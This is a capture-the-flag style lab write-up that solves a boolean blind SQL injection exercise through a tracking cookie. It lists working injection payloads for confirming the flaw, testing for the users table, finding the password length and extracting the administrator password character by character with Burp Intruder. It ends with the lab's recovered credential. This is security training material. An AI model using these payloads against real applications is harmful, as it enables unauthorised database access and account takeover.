# Description
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.
# Solution
| DB         | Description                 |
| ---------- | --------------------------- |
| Oracle     | `SUBSTR('foobar', 4, 2)`    |
| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL      | `SUBSTRING('foobar', 4, 2)` |
- Firstly, test whether if the application accepts cookie containing boolean.
```
Cookie: TrackingId=vi5OC8lBPKpjDTcP' AND 1=1--
```
=> True -> get response with the addition of "Welcome Back!" string (Content-Length: 5336),

```
Cookie: TrackingId=vi5OC8lBPKpjDTcP' AND 1=2--
```
=> False -> get response with the absense of "Welcome Back!" string (Content-Length: 5305)

```ad-summary
Now confirm that it is the **Boolean Blind-SQLi**.
```

- The database contains a table named `users` as the description gave above:
```
Cookie: TrackingId=JzNZwH5rrvjvtiJ' AND (SELECT 'a' FROM users LIMIT 1)='a
```
=> Get "Welcome Back!" response -> confirm we have users table.

- The description asks about the password of **administrator**:
```
Cookie: TrackingId=JzNZwH5rrvjvtiJ6' AND (SELECT 'a' FROM users where username == 'administrator')='a
```
=> Verify the **administrator** user has existed.

- To determine the password, we must know the length of string:
```
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>$1$)='a
```

- Using **Intruder** to find the length by **Numbers** payload type => Trying all number one by one.

![](../../Image/Pasted%20image%2020250515202725.png)

- 

![](../../Image/Pasted%20image%2020250515201207.png)

=> The length of password = 20.

- Using **Intruder** to find the string by **Cluster Bomb** attack type => Trying **bruteforcer** payload type
```
' AND (SELECT SUBSTRING(password,$1$,1) FROM users WHERE username = 'administrator') = '$s$
```

- **Payload 1:**

![](../../Image/Pasted%20image%2020250515205812.png)

- **Payload 2:**

![](../../Image/Pasted%20image%2020250515205846.png)

- **The result of Intruder:**

![](../../Image/Pasted%20image%2020250515211809.png)

=> administrator:eiy2h7phe24ti6yj8v9e